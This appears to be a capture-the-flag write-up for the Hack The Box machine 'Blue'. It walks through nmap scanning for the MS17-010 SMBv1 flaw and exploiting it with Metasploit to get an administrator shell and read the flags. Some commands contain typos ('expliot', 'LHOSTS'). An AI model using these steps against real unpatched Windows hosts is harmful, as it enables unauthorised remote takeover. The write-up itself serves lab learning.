## Synopsis


## :scroll: TL:DR :scroll:
Get **Privilege Escalation** on a **windows 7 Porfessional 7601 Service Pack 1 computer**.
Therefore find exploit `ms17-010` and run it. 
Take control over the windows computer and find user- en root:flags:.
 
## :rocket: Getting started :rocket:
We spawn the machine by clicking the button 

![ip](../img/blue_ip.png)


and add the given `ip` to our `/etc/hosts` file:
```sh
echo "10.129.231.168 blue.htb" | sudo tee -a /etc/hosts
```
## Enumeration
We start as always with a `nmap` scan 
```sh
nmap -sV -sC -oA blue blue.htb
```
wich result in a interesting open port:

![port 445 scan](../img/blue_port_445.png)


If we scan the port on vulernabilities

```sh
nmap --script smb-vuln-ms17-010 -p445 blue.htb
```
![nmap vulnerability scan](../img/blue_nmap_ms17-010.png)
it revails a vulnerability called `ms17-010` in Microsoft `SMBv1` accorring to **CVE-2017-0143**. 


## Expliotation
With `msfconsole` we can search for an exploit:

1. type `msfconsole` to start metasploit;
2. `search ms17-010`;
3. `use 0`;
4. `show options` gives the options for configuration;
5. `set RHOSTS blue.htb`
6. `set LHOSTS 10.10....`
7. `expliot`
8. `shell`
9. `whoami`
10. `cd \Users\Administrator\Desktop`
11. `type root.txt`

## :old_key:NOTES:old_key:

### :mortar_board: Lessons learned :mortar_board:
1. How to use `msfconsole`;
2. How to explicit scan with `nmap` for a vulnerability scan;
3. Windows does not support linux syntax :nerd:
